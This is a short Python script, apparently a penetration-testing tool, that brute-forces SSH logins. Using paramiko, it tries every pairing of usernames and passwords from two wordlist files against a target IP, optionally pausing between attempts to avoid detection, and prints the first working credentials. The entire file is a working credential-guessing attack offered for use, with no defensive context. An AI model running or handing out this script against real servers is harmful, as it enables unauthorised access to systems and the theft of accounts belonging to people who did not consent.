import paramiko
import paramiko.client
import argparse
from time import sleep

NOT_CONNECTED = 0
CONNECTED = 1

#Open and read files containing passwords/users
def load_wordlist(wordlist_input_file):
    wordlist = []

    with open(wordlist_input_file, 'r') as wordlist_input:
        file_lines = wordlist_input.readlines()
        for line in file_lines:
            wordlist.append(line.strip())

    return wordlist


#Open connection to SSH server
def attempt_connection(attempt_ip, attempt_username, attempt_password, wait_time):
    try:
        client = paramiko.client.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(attempt_ip,
                        username=attempt_username,
                        password=attempt_password)
        print(f"[+] Found valid credentials! Username: {attempt_username} Password: {attempt_password}")
        return CONNECTED

    except:
        print(f"[-] Failed attempt! Username: {attempt_username} Password: {attempt_password}")
        sleep(wait_time)
        return NOT_CONNECTED

#Start cycling through password list and attempt combination with provided user
#Have to add username list functionality here.
def cycle_list(attempt_ip, credentials, wait_time):

    for credential_set in credentials:
        if attempt_connection(attempt_ip, credential_set[0], credential_set[1], wait_time) == CONNECTED:
            break
        
def main():

    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--ip", help="IP to connect to")
    parser.add_argument("-P", "--passwordfile", help="File with passswords")
    parser.add_argument("-U", "--userfile", help="File with usernames")
    parser.add_argument("-w", "--wait", type=int,required=False, default=0, help="Wait time between requests")

    args = parser.parse_args()
    variables = vars(args)

    passwords = load_wordlist(variables['passwordfile'])
    usernames = load_wordlist(variables['userfile'])
    credentials = [(x,y) for y in passwords for x in usernames]
    cycle_list(variables['ip'], credentials, variables['wait'])  


if __name__ == '__main__':
    main()